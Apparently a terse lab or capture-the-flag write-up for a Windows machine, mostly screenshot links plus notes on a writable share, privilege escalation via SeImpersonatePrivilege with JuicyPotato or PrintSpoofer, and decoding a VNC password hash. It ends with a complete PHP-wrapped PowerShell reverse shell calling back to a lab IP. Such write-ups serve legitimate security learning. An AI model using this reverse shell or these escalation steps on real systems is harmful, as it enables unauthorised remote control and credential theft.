![image](https://github.com/user-attachments/assets/aaef55ca-1701-4134-84f0-ae7e2c5694d7)
![image](https://github.com/user-attachments/assets/bacf8f6f-f715-40be-92a2-f17d29b7138f)
![image](https://github.com/user-attachments/assets/b7fe6734-b595-41ef-bec5-01d1cb6f6f0a)
![image](https://github.com/user-attachments/assets/785541b9-3d93-4926-b9e0-01614974c2d1)
![image](https://github.com/user-attachments/assets/e9f4f2ad-11b1-4255-8fb5-54eaeadcbf11)
![image](https://github.com/user-attachments/assets/84239f12-d0f1-4d80-a8a4-cb59e9c6e070)
![image](https://github.com/user-attachments/assets/31b934e2-373d-4f05-89f7-41cb5dae6dbb)
![image](https://github.com/user-attachments/assets/47d1cb0c-8333-4c5a-9fe7-468873f4ab23)
![image](https://github.com/user-attachments/assets/02cfbfbd-9180-46c1-b2b0-4e41d34f82eb)
![image](https://github.com/user-attachments/assets/8bc7d2d3-9dd9-49f6-9c86-0484378ec013)
![image](https://github.com/user-attachments/assets/e7854b98-2cbe-486b-8702-d1e9e324f2ba)

Look around, cannot find entry point. Take a break.

Continue. Redeploy machine. Different IP. Check if share is writable.

![image](https://github.com/user-attachments/assets/e8c6cc76-5c96-4fc6-8f52-4637c10d16f5)
![image](https://github.com/user-attachments/assets/951a4363-5f7b-4d40-bc5f-ef3f1d9d4759)
![image](https://github.com/user-attachments/assets/42d93ccc-cfa9-4203-b68a-5f8914c4619e)
![image](https://github.com/user-attachments/assets/93cbc5c3-d6f0-4f45-8005-c17834f59896)
![image](https://github.com/user-attachments/assets/0ee08ecc-9a04-4c22-b8c7-17c436a54aac)
![image](https://github.com/user-attachments/assets/01cccb43-348c-4275-b995-ef1506f60c62)
![image](https://github.com/user-attachments/assets/c2c8bf3a-a8c5-4ada-9853-a8193400cdf3)
![image](https://github.com/user-attachments/assets/d31c38c4-ffd2-401a-8f23-616a03e174c9)
![image](https://github.com/user-attachments/assets/d995aaab-3b9f-4586-842a-0a30e1031329)

Machine is x64-based PC. SeImpersonatePrivilege Enabled. User JuicyPotato.exe or PrintSpoofer64.exe for PrivEsc.

Decody VNC password hash: upload vncpwd.exe to machine and run against ultravnc.ini Or on Kali run wine vncpwd.exe <Password-hash>


Windows PHP reverse shell
```bash
<?php
$cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ";
$cmd .= "\"\$client = New-Object System.Net.Sockets.TCPClient('10.4.95.140',5900);";
$cmd .= "\$stream = \$client.GetStream();";
$cmd .= "[byte[]]\$bytes = 0..65535|%{0};";
$cmd .= "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){";
$cmd .= "\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);";
$cmd .= "\$sendback = (iex \$data 2>&1 | Out-String );";
$cmd .= "\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';";
$cmd .= "\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);";
$cmd .= "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);";
$cmd .= "\$stream.Flush() }\";";
exec($cmd);
?>
```
